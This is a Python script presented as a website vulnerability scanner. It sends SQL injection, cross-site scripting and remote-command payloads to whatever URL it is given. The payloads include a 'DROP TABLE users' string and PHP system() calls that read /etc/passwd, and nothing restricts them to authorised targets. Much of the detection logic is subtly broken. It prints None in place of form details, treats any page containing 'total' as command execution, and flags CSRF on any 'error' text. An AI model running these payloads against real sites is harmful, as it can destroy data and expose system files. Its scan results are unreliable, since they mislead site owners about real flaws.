import os
import time
import pyfiglet
import platform
import requests
import argparse
import re
from pprint import pprint
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

def get_all_forms(url):
    soup = bs(session.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {}
    try:
        action = form.attrs.get("action").lower()
    except AttributeError:
        action = None
    
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        
        input_name = input.get("name")
        input_value = input.get("value")
        
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return session.post(target_url, data=data)
    else:
        return session.get(target_url, params=data)

def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False 

def scan_sql_injection(url):
    report = ""
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a",
        "1'; DROP TABLE users; --",
    ]
    for payload in payloads:
        new_url = f"{url}?input={payload}"
        res = session.get(new_url)
        
        if is_vulnerable(res):
            report += f"[!] SQL Injection vulnerability detected with payload '{payload}', link: {new_url}\n"
            report += "[+] Remediation: Update your system regularly.\n"
            return report
    
    forms = get_all_forms(url)
    report += f"[+] Detected {len(forms)} forms on {url}.\n"
    
    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"] + payload
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{payload}"
            
            url = urljoin(url, form_details["action"])
            
            if form_details["method"] == "post":
                res = session.post(url, data=data)
            elif form_details["method"] == "get":
                res = session.get(url, params=data)
            
            if is_vulnerable(res):
                report += f"[+] SQL Injection vulnerability detected with payload '{payload}', link: {url}\n"
                report += "[+] Form:\n"
                report += f"{pprint(form_details)}\n"
                break
            else:
                report += "[!] No SQL Vulnerability Detected.\n"
    
    return report

def scan_xss(url):
    report = ""
    forms = get_all_forms(url)
    time.sleep(3)
    report += f"[+] Detected {len(forms)} forms on {url}.\n"
    js_script = "<script>alert('XSS')</script>"
    payloads = [
        f"{js_script}",
        f"'><script>alert('XSS')</script><'",
    ]
    is_vulnerable = False
    
    for form in forms:
        form_details = get_form_details(form)
        for payload in payloads:
            content = submit_form(form_details, url, payload).content.decode()
            if payload in content:
                report += f"[!] XSS Detected on {url} with payload: {payload}\n"
                report += f"[!] Form details:\n{pprint(form_details)}\n"
                report += "[+] Remediation: Use sanitization libraries and input validation techniques.\n"
                is_vulnerable = True
            else:
                report += "[!] No XSS Vulnerability Detected.\n"
        
    return report

def remote_code_execution(url):
    report = ""
    payloads = [
        "system('ls');",
        "system('whoami');",
        "system('cat /etc/passwd');",
    ]
    for payload in payloads:
        response = requests.get(url, params={"input": payload})

        if "total" in response.text:
            report += f"[!] Possible RCE vulnerability detected with payload '{payload}': command output found in response\n"
            report += "[+] Remediation: Use Secure Coding Practices.\n"
        else:
            report += f"[!] No Remote Code Execution Vulnerability Detected with payload '{payload}'.\n"
    
    return report

def security_misconfiguration(url):
    response = requests.get(url)

    if "Server" in response.headers or "X-Powered-By" in response.headers or "Set-Cookie" in response.headers:
        return "[!] Security Misconfiguration Detected: Server Software Version, Framework, or Insecure Cookies found in Response.\n[+] Remediation: Use the latest security frameworks and ensure secure cookie practices.\n"
    else:
        return "[!] No Security Misconfiguration Vulnerability Detected.\n"

def broken_auth(url):
    username = "test"
    password = "password"

    response = requests.post(url, data={"username": username, "password": password})

    if "incorrect" in response.text or "session" in response.cookies:
        return "[!] Broken Authentication Detected: Weak Credentials or Session Cookie Found.\n[+] Remediation: Implement Two-Factor Authentication.\n"
    else:
        return "[!] No Broken Authentication Vulnerability Detected.\n[+] Remediation: Implement Two-Factor Authentication.\n"

def csrf_scan(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"input": "test"}
    response = requests.post(url, headers=headers, data=data)

    if "error" in response.text:
        return "[!] CSRF Vulnerability Detected: Error Message found in Response.\n[+] Remediation: Use CAPTCHA or Anti-CSRF Token.\n"
    else:
        return "[!] No CSRF Vulnerability Found.\n"

def banner():
    banr = pyfiglet.figlet_format("W3B_SC4NN3R")
    print(banr)

if __name__ == "__main__":
    if platform.system() == 'Linux':
        os.system('clear')
    elif platform.system() == 'Windows':
        os.system('cls')
    
    banner()
    parser = argparse.ArgumentParser(description='A tool for scanning websites for common vulnerabilities.')
    parser.add_argument('url', help='The URL of the website to scan')
    parser.add_argument('-t', '--timeout', type=int, default=3, help='The timeout for each request (in seconds)')
    args = parser.parse_args()
    
    print('[*] Target URL:', args.url)
    print('[*] Timeout:', args.timeout)
    print('[*] Output file:', f"{args.url}.txt")
    
    time.sleep(args.timeout)
    report = scan_sql_injection(args.url)
    print(report)
    
    time.sleep(args.timeout)
    report = scan_xss(args.url)
    print(report)
    
    time.sleep(args.timeout)
    report = remote_code_execution(args.url)
    print(report)
    
    time.sleep(args.timeout)
    report = security_misconfiguration(args.url)
    print(report)
    
    time.sleep(args.timeout)
    report = broken_auth(args.url)
    print(report)
    
    time.sleep(args.timeout)
    report = csrf_scan(args.url)
    print(report)
    
    print('[*] Generating Report.')
    output_file_name = re.sub(r'[^\w\s]', '_', args.url)
    with open(f"{output_file_name}.txt", 'w') as f:
        f.write('Vulnerability scan report for ' + args.url + ':\n\n')
        f.write(scan_sql_injection(args.url))
        f.write('\n\n')
        f.write(scan_xss(args.url))
        f.write('\n\n')
        f.write(remote_code_execution(args.url))
        f.write('\n\n')
        f.write(security_misconfiguration(args.url))
        f.write('\n\n')
        f.write(broken_auth(args.url))
        f.write('\n\n')
        f.write(csrf_scan(args.url))
        f.write('\n\n')

    print('[*] Report saved to', f"{output_file_name}.txt")
